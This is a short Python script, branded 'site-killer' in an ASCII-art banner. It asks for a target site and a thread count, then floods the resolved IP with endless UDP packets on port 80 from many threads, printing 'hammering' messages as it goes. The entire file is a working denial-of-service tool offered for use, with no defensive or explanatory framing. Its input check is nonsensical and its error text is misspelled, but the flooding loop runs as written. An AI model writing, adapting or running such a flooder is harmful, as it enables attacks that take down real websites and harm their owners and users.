import time
import colorama
colorama.init()
import socket
import sys
import _thread
import os
time.sleep(1)
os.system('cls')
print('')
print('      \033[31m ___(_) |_ ___      \033[32m| | _(_) | | ___ _ __ ')
print('      \033[31m/ __| | __/ _ )\033[32m_____| |/ / | | |/ _ \  __|')
print('      \033[32m\__ \ | ||  __/_____|   <| | | |  __/ |')   
print('      \033[32m|___/_|\__\___|     \033[31m|_|\_\_|_|_|\___|_|  ')
print("")

site = input("Enter your site url => ")
if site=='https,http':
    print('')
else:
    print('ERORE')
thread_count = input("Enter your thread => ")

ip = socket.gethostbyname(site)

UDP_PORT = 80
MESSAGE = "CodeWriter21"
print("UDP target IP=>", ip)
print("UDP target port=>", UDP_PORT)
time.sleep(3)


def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print ("\033[93m[+]",time.ctime(time.time()),"<--packet sent! hammering-->")

for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)

while 1:
    pass